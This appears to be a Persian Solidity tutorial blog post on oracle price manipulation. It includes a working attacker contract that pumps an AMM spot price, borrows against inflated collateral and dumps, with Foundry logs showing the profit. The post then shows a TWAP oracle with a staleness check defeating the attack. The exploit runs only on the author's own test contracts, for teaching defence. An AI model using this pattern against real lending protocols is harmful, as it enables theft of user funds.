+++
date = '2026-11-24T18:00:00+03:30'
draft = false
title = 'Oracle و دستکاری قیمت'
description = 'Oracle و دستکاری قیمت در Solidity: حمله‌ی تک‌تراکنشی به بازار وامِ خودم که قیمت را از AMM می‌خواند، و رفعش با oracle از نوع TWAP و چک کهنگی.'
contentType = 'tutorial'
categories = ["Blockchain"]
series = ["Blockchain"]
tags = ["blockchain", "solidity", "defi", "oracle", "security", "foundry"]
cover = { image = "/images/covers/bc-oracles.fa.png", alt = "Oracle و دستکاری قیمت", hiddenInSingle = true }
+++

قرارداد نمی‌تواند قیمت را از یک وب‌سایت بگیرد. هر عددی که استفاده می‌کند باید از قبل روی زنجیره باشد، یا کسی آن را گذاشته باشد یا از چیزی حساب شده باشد. این مسئله‌ی {{< term "oracle" "oracle" >}} است، و [وام‌دهی، وثیقه و liquidation](/fa/posts/bc-lending-liquidation/) با یک قیمت موقت از کنارش گذشت: عددی که مالک دستی وارد می‌کند.

جواب وسوسه‌انگیز از قبل دیپلوی شده: استخر [AMM و فرمول constant product](/fa/posts/bc-amm-constant-product/) یک قیمت دارد، `reserve1 / reserve0`. این پست بازار وام را به همین قیمت لحظه‌ای وصل می‌کند، در یک تراکنش به آن حمله می‌کند و بعد درستش می‌کند. حمله فقط روی قراردادهای خودم و در یک تست محلی Foundry اجرا می‌شود.

> اجرا با Foundry 1.8.7 و solc 0.8.38 روی macOS (arm64). پروژه‌ی پست قبل را کپی کردم، به `SimplePool` قیمت تجمعی اضافه کردم و `src/Oracles.sol` را با دو oracle نوشتم. قرارداد مهاجم در `test/` است. کد آموزشی است و audit نشده.

## حمله

استخر ۱٬۰۰۰ DEMO و ۱۰۰٬۰۰۰ USDX دارد، پس DEMO صد می‌ارزد. بازار تا ۷۵ درصد ارزش وثیقه وام می‌دهد و قیمت را از `SpotOracle` می‌گیرد که `pool.spotPrice0()` را برمی‌گرداند. مهاجم ۱۰۰ DEMO (به ارزش ۱۰٬۰۰۰) دارد و برای یک تراکنش ۱۰۰٬۰۰۰ USDX. روی mainnet این پول از {{< term "flash-loan" "flash loan" >}} می‌آید: وامی که باید تا پایان همان تراکنش برگردد، وگرنه کل تراکنش revert می‌شود. در تست یک mint جای آن را گرفته:

```solidity
function attack(uint256 loan, uint256 ownDemo) external returns (uint256 borrowed, uint256 priceSeen) {
    // 1. pump: buy DEMO with the loan, the pool's DEMO price jumps
    uint256 bought = pool.swap(address(usdx), loan, 0, address(this), block.timestamp);
    // 2. post own DEMO as collateral and borrow as much as the oracle allows
    market.deposit(ownDemo);
    priceSeen = market.oracle().price();
    borrowed = market.borrowLimit(address(this));
    market.borrow(borrowed);
    // 3. dump: sell the bought DEMO back, the price returns close to where it was
    pool.swap(address(demo), bought, 0, address(this), block.timestamp);
    // 4. repay the loan; whatever USDX is left is the attacker's
    usdx.transfer(msg.sender, loan);
}
```

```
$ forge test --mt test_SpotOracleIsDrained -vv
[PASS] test_SpotOracleIsDrained() (gas: 1261959)
Logs:
  price the market saw 399399999999999999999
  borrowed             29954999999999999999925
  USDX kept            29654550002031084112357
  profit (USDX)        19654550002031084112357
  pool price after     100300449997968915887
  market health        267869671168002446
```

خرید با ۱۰۰٬۰۰۰ USDX قیمت لحظه‌ای را به ۳۹۹٫۴ رساند، همان‌طور که جدول price impact پست AMM پیش‌بینی می‌کرد. بازار ۱۰۰ DEMO را ۳۹٬۹۴۰ ارزش‌گذاری کرد و ۲۹٬۹۵۵ وام داد. فروش دوباره حدود ۳۰۰ کارمزد خرج داشت. مهاجم بعد از پس دادن وام ۲۹٬۶۵۴٫۵۵ USDX نگه می‌دارد و وثیقه‌ای به ارزش ۱۰٬۰۰۰ را رها می‌کند: سود ۱۹٬۶۵۴٫۵۵. استخر به نزدیک ۱۰۰ برگشته و بازار وامی با health برابر ۰٫۲۷ دارد که هیچ liquidationی درستش نمی‌کند. این {{< term "price-manipulation" "دستکاری قیمت" >}} است و نه استخر باگ داشت نه بازار. طراحی به عددی اعتماد کرد که هر کسی با پرداخت کارمزد swap می‌تواند جابه‌جایش کند.

تا جایی که از گزارش‌های عمومی بعد از حادثه می‌دانم، چند پروتکل وام واقعی دقیقاً با همین شکل پول از دست داده‌اند. اسمی نمی‌برم، چون اینجا نمی‌توانم جزئیات را بررسی کنم.

## رفع: میانگین زمانی

قیمت لحظه‌ای یک لحظه است و مهاجم داخل تراکنش خودش صاحب آن لحظه است. میانگین در طول زمان خیلی سخت‌تر جابه‌جا می‌شود. استخر حالا جمع پیوسته‌ی قیمت ضرب در ثانیه را نگه می‌دارد، شبیه قیمت تجمعی Uniswap v2 تا جایی که من می‌فهمم:

```solidity
function _accumulate() internal {
    uint256 dt = block.timestamp - lastUpdate;
    if (dt > 0 && reserve0 != 0) price0Cumulative += reserve1 * 1e18 / reserve0 * dt;
    lastUpdate = block.timestamp;
}
```

این تابع اول هر swap و هر تغییر نقدینگی، با موجودی‌های قبل از آن، اجرا می‌شود. قیمتی که داخل یک بلاک ساخته شود فقط وقتی زمان بگذرد حساب می‌شود. {{< term "twap" "TWAP" >}} تفاضل دو خوانش تقسیم بر ثانیه‌های بینشان است:

```solidity
function update() external {
    uint256 elapsed = block.timestamp - lastTimestamp;
    if (elapsed < window) revert WindowNotElapsed(elapsed);
    uint256 cumulative = pool.currentCumulative();
    average = (cumulative - lastCumulative) / elapsed;
    lastCumulative = cumulative;
    lastTimestamp = block.timestamp;
}

function price() external view returns (uint256) {
    uint256 age = block.timestamp - lastTimestamp;
    if (age > 2 * window) revert StalePrice(age); // refuse to lend against an old price
    return average;
}
```

همان مهاجم، همان عددها، بازاری که قیمت را از TWAP سی‌دقیقه‌ای می‌گیرد:

```
$ forge test --mt test_TwapOracleResists -vv
  price the market saw 100000000000000000000
  borrowed             7500000000000000000000
  USDX kept            7199550002031084112432
  profit (USDX)        -2800449997968915887568
  market health        1066666666666666666
(trimmed)
```

مهاجم یک وام عادی گرفت، ۷٬۵۰۰ در برابر ۱۰٬۰۰۰، و ۳۰۰ کارمزد رفت‌وبرگشت داد. رها کردن وثیقه حالا ۲٬۸۰۰ ضرر دارد. حتی صدا زدن `update()` درست بعد از pump چیزی را عوض نمی‌کند، چون قیمتِ باد‌شده صفر ثانیه برقرار بوده:

```
$ forge test --mt test_TwapIgnoresSameBlockPump -vv
  spot after pump 399399999999999999999
  twap            100000000000000000000
```

## هزینه‌ی TWAP

TWAP عقب می‌ماند. یک خرید واقعی که قیمت لحظه‌ای را ده دقیقه مانده به پایان یک پنجره‌ی سی‌دقیقه‌ای به ۱۴۶٫۳۳ می‌برد:

```
$ forge test --mt test_TwapFollowsALastingMove -vv
  spot after a real buy 146333769999999999999
  twap over 30 minutes  115444589999999999999
```

در یک سقوط، liquidationها دیر می‌رسند. نگه داشتن قیمت در چند بلاک هم حمله‌ی دیگری است: به خاطر arbitrage سخت‌تر و پرهزینه‌تر، ولی روی استخر کم‌عمق ناممکن نیست. طول پنجره، امنیت را با تازگی معامله می‌کند. اگر کسی `update()` را صدا نزند، `price()` revert می‌شود (`test_StalePriceRefused`): وام دادن متوقف می‌شود، نه این‌که با قیمت کهنه ادامه پیدا کند.

طراحی رایج دیگر push oracle است: گزارشگرهای مستقل قیمت را روی زنجیره منتشر می‌کنند. feedهای سبک Chainlink، طبق مستنداتشان، جواب را همراه یک timestamp به اسم `updatedAt` برمی‌گردانند. مصرف‌کننده باید جواب کهنه و جهش‌های بزرگ‌تر از یک حد انحراف را رد کند. اینجا چنین چیزی نساختم؛ قاعده‌ی کهنگی بالا همان ایده است.

## کجا oracle فریب می‌خورد

- هرگز وثیقه را با قیمت لحظه‌ای استخری که در همان تراکنش قابل معامله است ارزش‌گذاری نکنید.
- flash loan به هر کسی برای یک تراکنش سرمایه‌ی بزرگ می‌دهد. «پول زیادی لازم دارد» دفاع نیست.
- تازگی را چک کنید: oracleی که به‌روز نشده باید وام را متوقف کند، نه بی‌صدا جواب بدهد.
- پنجره‌ی TWAP را متناسب با عمق استخر انتخاب کنید؛ استخر کم‌عمق پنجره‌ی بلندتر یا منبع دیگری می‌خواهد.

## تمرین

۱. کوچک‌ترین وامی را پیدا کنید که حمله به spot oracle را هنوز سودآور می‌کند.
۲. فراخوانی `update()` مهاجم را یک بلاک بعد از pump ببرید (`vm.roll` و `vm.warp` به اندازه‌ی ۱۲ ثانیه). TWAP چقدر جابه‌جا می‌شود؟
۳. محافظی بنویسید که وقتی قیمت لحظه‌ای و TWAP بیش از ۵ درصد فاصله دارند وام ندهد.

## قدم بعدی

**امنیت قرارداد: reentrancy، access control و نمونه‌های واقعی**: این حمله به باگ نیاز نداشت؛ حمله‌های بعدی دارند.
